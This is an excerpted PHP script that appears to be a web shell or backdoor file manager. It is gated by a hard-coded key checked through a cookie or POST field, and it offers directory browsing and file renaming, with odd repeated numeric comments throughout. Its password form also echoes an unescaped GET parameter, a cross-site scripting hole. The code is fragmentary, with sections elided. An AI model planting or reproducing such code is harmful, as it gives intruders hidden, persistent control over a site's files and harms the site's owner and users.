...
$auth_key = "292fcd3b05cb0beb52a3334c5566cd8a";
...
$pass = false;
if (isset($_COOKIE['pw_name_28942'])) {
    if(($_COOKIE['pw_name_28942']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_28942'])) {
        if(($_POST['pw_name_28942']) == $auth_key) {
            setcookie("pw_name_28942", $_POST['pw_name_28942']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_28942' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726400043385927 1726400043245475 1726400043290929 1726400043474699
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726400043385927 1726400043245475 1726400043290929 1726400043474699
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726400043385927 1726400043245475 1726400043290929 1726400043474699
            $name = PATH . "/" . $_GET['r'];
